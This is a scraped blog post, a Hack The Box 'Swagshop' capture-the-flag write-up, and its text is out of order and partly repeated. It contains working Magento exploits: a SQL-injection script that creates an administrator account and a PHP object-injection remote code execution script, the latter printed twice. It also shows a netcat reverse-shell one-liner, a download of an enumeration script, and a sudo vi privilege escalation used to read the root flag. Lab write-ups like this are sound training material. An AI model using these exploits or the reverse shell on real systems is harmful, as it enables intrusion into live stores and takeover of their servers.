60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 #!/usr/bin/python # Exploit Title: Magento CE &lt; 1.9.0.1 Post Auth RCE # Google Dork: &quot;Powered by Magento&quot; # Date: 08/18/2015 # Exploit Author: @Ebrietas0 || http://ebrietas0.blogspot.com # Vendor Homepage: http://magento.com/ # Software Link: https://www.magentocommerce.com/download # Version: 1.9.0.1 and below # Tested on: Ubuntu 15 # CVE : none from hashlib import md5 import sys import re import base64 import mechanize def usage(): print &quot;Usage: python %s &lt;target&gt; &lt;argument&gt;\\nExample: python %s http://localhost \\&quot;uname -a\\&quot;&quot; sys.exit() if len(sys.argv) != 3: usage() # Command-line args target = sys.argv[1] arg = sys.argv[2] # Config. username = &#39;try&#39; password = &#39;again&#39; php_function = &#39;system&#39; # Note: we can only pass 1 argument to the function install_date = &#39;Wed, 08 May 2019 07:23:09 +0000&#39; # This needs to be the exact date from /app/etc/local.xml # POP chain to pivot into call_user_exec payload = &#39;O:8:\\&quot;Zend_Log\\&quot;:1:{s:11:\\&quot;\\00*\\00_writers\\&quot;;a:2:{i:0;O:20:\\&quot;Zend_Log_Writer_Mail\\&quot;:4:{s:16:&#39; \\ &#39;\\&quot;\\00*\\00_eventsToMail\\&quot;;a:3:{i:0;s:11:\\&quot;EXTERMINATE\\&quot;;i:1;s:12:\\&quot;EXTERMINATE!\\&quot;;i:2;s:15:\\&quot;&#39; \\ &#39;EXTERMINATE!!!!\\&quot;;}s:22:\\&quot;\\00*\\00_subjectPrependText\\&quot;;N;s:10:\\&quot;\\00*\\00_layout\\&quot;;O:23:\\&quot;&#39; \\ &#39;Zend_Config_Writer_Yaml\\&quot;:3:{s:15:\\&quot;\\00*\\00_yamlEncoder\\&quot;;s:%d:\\&quot;%s\\&quot;;s:17:\\&quot;\\00*\\00&#39; \\ &#39;_loadedSection\\&quot;;N;s:10:\\&quot;\\00*\\00_config\\&quot;;O:13:\\&quot;Varien_Object\\&quot;:1:{s:8:\\&quot;\\00*\\00_data\\&quot;&#39; \\ &#39;;s:%d:\\&quot;%s\\&quot;;}}s:8:\\&quot;\\00*\\00_mail\\&quot;;O:9:\\&quot;Zend_Mail\\&quot;:0:{}}i:1;i:2;}}&#39; % (len(php_function), php_function, len(arg), arg) # Setup the mechanize browser and options br = mechanize.Browser() #br.set_proxies({&quot;http&quot;: &quot;localhost:8080&quot;}) br.set_handle_robots(False) request = br.open(target) br.select_form(nr=0) br.form.new_control(&#39;text&#39;, &#39;login[username]&#39;, {&#39;value&#39;: username}) # Had to manually add username control. br.form.fixup() br[&#39;login[username]&#39;] = username br[&#39;login[password]&#39;] = password br.method = &quot;POST&quot; request = br.submit() content = request.read() url = re.search(&quot;ajaxBlockUrl = \\&#39;(.*)\\&#39;&quot;, content) url = url.group(1) key = re.search(&quot;var FORM_KEY = &#39;(.*)&#39;&quot;, content) key = key.group(1) request = br.open(url + &#39;block/tab_orders/period/7d/?isAjax=true&#39;, data=&#39;isAjax=false&amp;form_key=&#39; + key) tunnel = re.search(&quot;src=\\&quot;(.*)\\?ga=&quot;, request.read()) tunnel = tunnel.group(1) payload = base64.b64encode(payload) gh = md5(payload + install_date).hexdigest() exploit = tunnel + &#39;?ga=&#39; + payload + &#39;&amp;h=&#39; + gh try: request = br.open(exploit) except (mechanize.HTTPError, mechanize.URLError) as e: print e.read() For the install_date variable, it can be found in http://swagshop.htb/app/etc/local.xml. Now lets test it out with a whoami command. For the target variable, which is the first argument, it is the URL of the admin login page (http://10.10.10.140.htb/index.php/admin). Note that we cannot use the domain name swagshop.htb as we will always be redirected to 10.10.10.140 for some reason. 1 2 $ python poc.py http://10.10.10.140/index.php/admin &quot;whoami&quot; www-data Great! Now lets our listener and establish a reverse shell connection! 1 2 $ nc -lvnp 1337 listening on [any] 1337 ... 1 $ python poc.py http://10.10.10.140/index.php/admin &quot;rm /tmp/g;mkfifo /tmp/g;cat /tmp/g|/bin/sh -i 2&gt;&amp;1|nc 10.10.XXX.XXX 1337 &gt;/tmp/g&quot; As expected, we caught the reverse shell. 1 2 3 4 connect to [10.10.XXX.XXX] from (UNKNOWN) [10.10.10.140] 39904 /bin/sh: 0: can&#39;t access tty; job control turned off $ whoami www-data Enumeration To quickly enumerate for possible privilege escalation vectors, I will using LinEnum. To transfer it from my machine to this machine, I will be using python’s SimpleHTTPServer module. On my machine: 1 2 3 4 5 $ mkdir httpserver $ cd httpserver $ cp ~/Downloads/LinEnum.sh . $ python -m SimpleHTTPServer 80 Serving HTTP on 0.0.0.0 port 80 ... On the Swagshop machine: 1 2 3 4 5 6 7 8 9 10 11 12 $ wget http://10.10.14.140/LinEnum.sh --2019-09-07 05:03:29-- http://10.10.14.140/LinEnum.sh Connecting to 10.10.14.140:80... connected. HTTP request sent, awaiting response... 200 OK Length: 45651 (45K) [text/x-sh] Saving to: &#39;LinEnum.sh&#39; 0K .......... .......... .......... .......... .... 100% 82.5K=0.5s 2019-09-07 05:03:31 (82.5 KB/s) - &#39;LinEnum.sh&#39; saved [45651/45651] $ chmod 777 LinEnum.sh $ ./LinEnum.sh LinEnum.sh revealed that www-data had sudo privileges. 1 2 3 4 5 6 User www-data may run the following commands on swagshop: (root) NOPASSWD: /usr/bin/vi /var/www/html/* [+] Possible sudo pwnage! /usr/bin/vi www-data is only able to execute /usr/bin/vi on a file in /var/www/html/ as root. To read the root flag, there are actually 2 ways to go about doing this. root.txt (1) vi actually has the ability to open a shell inside it by entering :!bash. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 $ sudo /usr/bin/vi /var/www/html/a ~ :!bash whoami root cat /root/root.txt c2b0XXXXXXXXXXXXXXXXXXXXXXXXXXXX ___ ___ /| |/|\\| |\\ /_| ´ |.` |_\\ We are open! (Almost) | |. | | |. | Join the beta HTB Swag Store! |___|.__| https://hackthebox.store/password PS: Use root flag as password! root.txt (2) If we create a symbolic link in /var/www/html that references the root flag, we will be able to trick sudo into thinking we are simply opening a file in /var/www/html/ with vi! 1 2 3 4 5 6 7 8 9 10 11 12 $ ln -s /root/root.txt /var/www/html/root.txt $ sudo vi /var/www/html/root.txt c2b0XXXXXXXXXXXXXXXXXXXXXXXXXXXX ___ ___ /| |/|\\| |\\ /_| ´ |.` |_\\ We are open! (Almost) | |. | | |. | Join the beta HTB Swag Store! |___|.__| https://hackthebox.store/password PS: Use root flag as password! Rooted ! Thank you for reading and look forward for more writeups and articles !","url":"https://rizemon.github.io/posts/swagshop-htb/","@type":"BlogPosting","headline":"Hack The Box - Swagshop","dateModified":"2021-01-03T20:34:47+08:00","datePublished":"2019-09-29T10:00:00+08:00","@context":"https://schema.org"}</script><title>Hack The Box - Swagshop | rizemon's blog</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" href="/assets/css/post.css" as="style"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/portfolio.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">rizemon's blog</a></div><div class="site-subtitle font-italic">Cyber Security Enthusiast.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/tabs/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tabs/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/tabs/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/tabs/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT ME</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/rizemon" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/rizemon" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Hack The Box - Swagshop</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hack The Box - Swagshop</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sun, Sep 29, 2019, 10:00 AM +0800" > Sep 29, 2019 <i class="unloaded">2019-09-29T10:00:00+08:00</i> </span> by <span class="author"> rizemon </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sun, Jan 3, 2021, 8:34 PM +0800" > Jan 3, 2021 <i class="unloaded">2021-01-03T20:34:47+08:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1536 words">8 min</span></div></div><div class="post-content"><p>This machine was not my first Linux machine but I had fun rooted this machine ! :D</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/swagshop.png" alt="" height="414px" width="615px" /></p><h1 id="configuration">Configuration</h1><p>The operating system that I will be using to tackle this machine is a Kali Linux VM.</p><p>Always remember to map a domain name to the machine’s IP address to ease your rooting !</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"10.10.10.140 swagshop.htb"</span> <span class="o">&gt;&gt;</span> /etc/hosts
</pre></table></code></div></div><h1 id="reconnaissance">Reconnaissance</h1><p>Using <code class="language-plaintext highlighter-rouge">nmap</code>, we are able to determine the open ports and running services on the machine.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="nv">$ </span>nmap <span class="nt">-sS</span> swagshop.htb <span class="nt">-p</span> 1-65535 <span class="nt">-T4</span>
Nmap scan report <span class="k">for </span>swagshop.htb <span class="o">(</span>10.10.10.140<span class="o">)</span>
Host is up <span class="o">(</span>0.25s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 64605 closed ports, 928 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>1312.66 seconds
</pre></table></code></div></div><p>Not much can be done with the <code class="language-plaintext highlighter-rouge">ssh</code> service as we do not have any credentials on hand so lets come back to it later. As for the <code class="language-plaintext highlighter-rouge">http</code> service, lets see if we can gather any information or exploit it ?</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/swagshop1.png" alt="" /></p><p><code class="language-plaintext highlighter-rouge">Magento</code> ? After some searching, we found out that <code class="language-plaintext highlighter-rouge">Magento</code> is an open-source website that people can use to run their e-commerce business.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/swagshop2.png" alt="" /></p><h1 id="exploitation-1">Exploitation (1)</h1><p>Lets try to find some exploits for Magento</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="nv">$ </span>searchsploit magento
<span class="nt">----------------------------------------------------------------------------------------</span> <span class="nt">----------------------------------------</span>
 Exploit Title                                                                          |  Path
                                                                                        | <span class="o">(</span>/usr/share/exploitdb/<span class="o">)</span>
<span class="nt">----------------------------------------------------------------------------------------</span> <span class="nt">----------------------------------------</span>
Magento 1.2 - <span class="s1">'/app/code/core/Mage/Admin/Model/Session.php?login['</span>Username<span class="s1">']'</span> Cross-Sit | exploits/php/webapps/32808.txt
Magento 1.2 - <span class="s1">'/app/code/core/Mage/Adminhtml/controllers/IndexController.php?email'</span> Cro | exploits/php/webapps/32809.txt
Magento 1.2 - <span class="s1">'downloader/index.php'</span> Cross-Site Scripting                               | exploits/php/webapps/32810.txt
Magento &lt; 2.0.6 - Arbitrary Unserialize / Arbitrary Write File                          | exploits/php/webapps/39838.php
Magento CE &lt; 1.9.0.1 - <span class="o">(</span>Authenticated<span class="o">)</span> Remote Code Execution                            | exploits/php/webapps/37811.py
Magento Server MAGMI Plugin - Multiple Vulnerabilities                                  | exploits/php/webapps/35996.txt
Magento Server MAGMI Plugin 0.7.17a - Remote File Inclusion                             | exploits/php/webapps/35052.txt
Magento eCommerce - Local File Disclosure                                               | exploits/php/webapps/19793.txt
Magento eCommerce - Remote Code Execution                                               | exploits/xml/webapps/37977.py
eBay Magento 1.9.2.1 - PHP FPM XML eXternal Entity Injection                            | exploits/php/webapps/38573.txt
eBay Magento CE 1.9.2.1 - Unrestricted Cron Script <span class="o">(</span>Code Execution / Denial of Service<span class="o">)</span> | exploits/php/webapps/38651.txt
<span class="nt">----------------------------------------------------------------------------------------</span> <span class="nt">----------------------------------------</span>
Shellcodes: No Result
Papers: No Result
</pre></table></code></div></div><p>The one worked was <code class="language-plaintext highlighter-rouge">Magento eCommerce - Remote Code Execution</code>. Below is a slightly modified version.</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">base64</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="n">target</span> <span class="o">=</span> <span class="s">"http://swagshop.htb/"</span>

<span class="n">username</span> <span class="o">=</span> <span class="s">"try"</span>
<span class="n">password</span> <span class="o">=</span> <span class="s">"again"</span>

<span class="k">if</span> <span class="ow">not</span> <span class="n">target</span><span class="p">.</span><span class="n">startswith</span><span class="p">(</span><span class="s">"http"</span><span class="p">):</span>
    <span class="n">target</span> <span class="o">=</span> <span class="s">"http://"</span> <span class="o">+</span> <span class="n">target</span>

<span class="k">if</span> <span class="n">target</span><span class="p">.</span><span class="n">endswith</span><span class="p">(</span><span class="s">"/"</span><span class="p">):</span>
    <span class="n">target</span> <span class="o">=</span> <span class="n">target</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>

<span class="n">target_url</span> <span class="o">=</span> <span class="n">target</span> <span class="o">+</span> <span class="s">"/admin/Cms_Wysiwyg/directive/index/"</span>

<span class="n">q</span><span class="o">=</span><span class="s">"""
SET @SALT = 'rp';
SET @PASS = CONCAT(MD5(CONCAT( @SALT , '{password}') ), CONCAT(':', @SALT ));
SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;
INSERT INTO `admin_user` 
(`firstname`, `lastname`,`email`,`username`,`password`,`created`,
`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) 
VALUES ('Firstname','Lastname','email@example.com','{username}',@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());
INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) 
VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = '{username}'),'Firstname');
"""</span>


<span class="n">query</span> <span class="o">=</span> <span class="n">q</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">).</span><span class="nb">format</span><span class="p">(</span><span class="n">username</span><span class="o">=</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="n">password</span><span class="p">)</span>
<span class="n">pfilter</span> <span class="o">=</span> <span class="s">"popularity[from]=0&amp;popularity[to]=3&amp;popularity[field_expr]=0);{0}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">query</span><span class="p">)</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">target_url</span><span class="p">,</span> 
                  <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s">"___directive"</span><span class="p">:</span> <span class="s">"e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ"</span><span class="p">,</span>
                        <span class="s">"filter"</span><span class="p">:</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">pfilter</span><span class="p">),</span>
                        <span class="s">"forwarded"</span><span class="p">:</span> <span class="mi">1</span><span class="p">})</span>
<span class="k">if</span> <span class="n">r</span><span class="p">.</span><span class="n">ok</span><span class="p">:</span>
    <span class="k">print</span> <span class="s">"WORKED"</span>
    <span class="k">print</span> <span class="s">"Check {0}/admin with creds {1}:{2}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="k">print</span> <span class="s">"DID NOT WORK"</span>
</pre></table></code></div></div><p>Before running the script, I checked whether <code class="language-plaintext highlighter-rouge">http://swagshop.htb/admin/Cms_Wysiwyg/directive/index/</code> was a valid URL. Unfortunately, it wasn’t. Maybe we need to specify a base URL ?</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/swagshop3.png" alt="" /></p><p>When browsing the website, I realised that the different page URLs were being appended to <code class="language-plaintext highlighter-rouge">index.php</code>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/swagshop4.png" alt="" /><br /> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/swagshop5.png" alt="" /></p><p>To test my theory, I browsed to <code class="language-plaintext highlighter-rouge">http://swagshop.htb/index.php/admin</code> and I was greeted by the the admin panel login page.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/swagshop6.png" alt="" /></p><p>So if we try appending <code class="language-plaintext highlighter-rouge">index.php</code> to the <code class="language-plaintext highlighter-rouge">target</code> variable in the script</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">target</span> <span class="o">=</span> <span class="s">"http://swagshop.htb/index.php"</span>
</pre></table></code></div></div><p>and running the script,</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nv">$ </span>python magento.py
WORKED
Check http://swagshop.htb/index.php/admin with creds try:again
</pre></table></code></div></div><p>It worked ! Lets try to login as <code class="language-plaintext highlighter-rouge">try:again</code>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/swagshop7.png" alt="" /></p><h1 id="exploitation-2">Exploitation (2)</h1><p>Alright! We got an administrative account which can pretty much have access to all the features on the website. Lets try to establish a foothold on the box which requires another exploit to be used. Back to our searchploit results, there was one exploit that required us to be authenticated.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>Magento CE &lt; 1.9.0.1 - <span class="o">(</span>Authenticated<span class="o">)</span> Remote Code Execution                            | exploits/php/webapps/37811.py
</pre></table></code></div></div><p>I’ve configured the script in this way:</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python
# Exploit Title: Magento CE &lt; 1.9.0.1 Post Auth RCE 
# Google Dork: "Powered by Magento"
# Date: 08/18/2015
# Exploit Author: @Ebrietas0 || http://ebrietas0.blogspot.com
# Vendor Homepage: http://magento.com/
# Software Link: https://www.magentocommerce.com/download
# Version: 1.9.0.1 and below
# Tested on: Ubuntu 15
# CVE : none
</span>
<span class="kn">from</span> <span class="nn">hashlib</span> <span class="kn">import</span> <span class="n">md5</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">re</span>
<span class="kn">import</span> <span class="nn">base64</span>
<span class="kn">import</span> <span class="nn">mechanize</span>


<span class="k">def</span> <span class="nf">usage</span><span class="p">():</span>
    <span class="k">print</span> <span class="s">"Usage: python %s &lt;target&gt; &lt;argument&gt;</span><span class="se">\n</span><span class="s">Example: python %s http://localhost </span><span class="se">\"</span><span class="s">uname -a</span><span class="se">\"</span><span class="s">"</span>
    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">()</span>


<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">:</span>
    <span class="n">usage</span><span class="p">()</span>

<span class="c1"># Command-line args
</span><span class="n">target</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<span class="n">arg</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>

<span class="c1"># Config.
</span><span class="n">username</span> <span class="o">=</span> <span class="s">'try'</span>
<span class="n">password</span> <span class="o">=</span> <span class="s">'again'</span>
